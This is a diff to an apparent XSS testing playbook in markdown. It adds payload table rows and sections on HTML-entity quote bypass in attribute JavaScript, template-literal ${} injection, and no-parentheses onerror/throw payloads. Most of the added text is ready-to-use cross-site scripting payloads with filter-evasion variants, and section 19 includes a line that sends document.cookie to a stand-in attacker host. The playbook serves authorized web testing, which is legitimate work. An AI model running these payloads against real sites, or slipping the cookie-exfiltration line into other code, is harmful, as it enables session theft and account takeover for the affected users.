@@ -20,13 +20,16 @@
 | 10 | URL/href attribute | `javascript:alert(1)` |
 | 11 | SVG animation | `<svg><a><animate attributeName="href" values="javascript:alert(1)"/><text x=20 y=20>click</text></a></svg>` |
 | 12 | Namespace bypass | `<a xlink:href="javascript:alert(1)">click</a>` |
-| 13 | No parentheses allowed | `onerror=alert;throw 1` |
+| 13 | No parentheses allowed | `onerror=alert;throw 1` — see `bypass-no-parentheses.md` for full ladder |
 | 14 | Attribute only (no new tags) | `accesskey="x" onclick="alert(1)"` (trigger: ALT+SHIFT+X) |
 | 15 | Custom/unknown tag | `<xss onclick=alert(1)>click</xss>` |
+| 16 | Attribute JS context, quotes filtered | `&apos;-alert(1)-&apos;` — HTML entity decoded by browser before JS runs |
+| 17 | Template literal context (backticks) | `${alert(1)}` — no string break needed; `${}` is a live expression slot |
 
 ### Decision: when to stop
 - Payload executes → **report hit**; record context + parameter + payload.
-- All 15 rows fail → escalate to `dom-xss.md`.
+- All 17 rows fail → escalate to `dom-xss.md`.
+- `()` filtered → read `bypass-no-parentheses.md` for full escalation ladder.
 
 ---
 
@@ -378,5 +381,147 @@ href = javascript:alert(1)
 * Namespace confusion
 * JS parsing context
 * DOM mutation
+
+---
+
+## 18. HTML Encoding in Attribute JavaScript Context
+
+### Context
+
+User input lands inside a JavaScript string that is itself inside an HTML attribute:
+
+```html
+<a onclick="var x='USER_INPUT'">
+```
+
+### Why HTML encoding bypasses quote filters
+
+Blocked: `'  "  (  )`
+
+HTML entities are **not decoded by the server**. The browser decodes them during HTML parsing, **before** JavaScript executes. So a filtered `'` can be delivered as `&apos;` or `&#39;`.
+
+### Exploit flow
+
+1. Inject: `&apos;-alert(document.domain)-&apos;`
+2. Server response (raw): `onclick="var x='&apos;-alert(1)-&apos;'"` 
+3. Browser decodes: `var x='' - alert(1) - '';`
+4. JS executes: `alert(1)` fires as a side-effect of the arithmetic expression
+
+### Payloads
+
+```html
+&apos;-alert(1)-&apos;
+```
+
+```html
+&#39;-alert(1)-&#39;
+```
+
+```html
+onclick="alert&#40;1&#41;"
+```
+
+### Entity encoding reference
+
+| Char | Named | Decimal |
+|------|-------|---------|
+| `'`  | `&apos;` | `&#39;` |
+| `"`  | `&quot;` | `&#34;` |
+| `(`  | — | `&#40;` |
+| `)`  | — | `&#41;` |
+| `<`  | `&lt;` | `&#60;` |
+| `>`  | `&gt;` | `&#62;` |
+
+### Context behavior — what works where
+
+| Context | Entities decoded | Code executes |
+|---------|-----------------|---------------|
+| HTML text node | yes | no |
+| Attribute value (JS) | yes | yes |
+| Tag structure `< >` | no | no |
+
+### Key rule
+
+If input → HTML attribute → JavaScript:  HTML entity encoding = filter bypass primitive.
+
+`&lt;img onerror=...&gt;` injected as raw text does **not** create an element — entities in tag position are not decoded into structure.
+
+---
+
+## 19. Template Literals — Expression Injection
+
+### Context
+
+User input lands inside a backtick template literal:
+
+```html
+<script>
+var input = `USER_INPUT`;
+</script>
+```
+
+### Core mechanism
+
+`${...}` inside a template literal is a **live JS expression slot** — the engine evaluates whatever is inside it. No string break is needed.
+
+### Exploit
+
+```js
+${alert(document.domain)}
+```
+
+Result in page:
+
+```js
+var input = `${alert(document.domain)}`;
+```
+
+→ `alert()` fires; return value (`undefined`) becomes the string content.
+
+### Payload variants
+
+```js
+${alert(1)}
+${confirm(1)}
+${console.log(document.cookie)}
+${alert(1),alert(2)}          // comma chains multiple calls
+${fetch('//attacker.com/'+document.cookie)}
+```
+
+### If `alert` is blocked
+
+```js
+${confirm(1)}
+${window['ale'+'rt'](1)}
+${eval('ale'+'rt(1)')}
+```
+
+### Constraints
+
+- Works **only** inside backticks
+- `${}` has **no effect** inside `'...'` or `"..."` strings
+- Do NOT use string-break tricks (`';alert(1);//`) here — they are unnecessary
+
+### Mental model
+
+Normal string injection: break syntax → inject statements 
+Template literal injection: no break needed → inject directly into expression slot
+
+---
+
+## 20. No Parentheses — onerror + throw (Reference)
+
+Full payload ladder is in `bypass-no-parentheses.md`.
+
+### Quick payloads
+
+| Constraint | Payload |
+|------------|---------|
+| Baseline | `onerror=alert;throw 1337` |
+| No `;` | `{onerror=alert}throw 1337` |
+| No `;` or quotes | `throw onerror=alert,1337` |
+| Need arbitrary exec | `onerror=eval;throw '=alert(1)'` |
+| Firefox | `{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}` |
+| No `throw` | `TypeError.prototype.name='=/',0[onerror=eval]['/-alert(1)//']` |
 
 ---
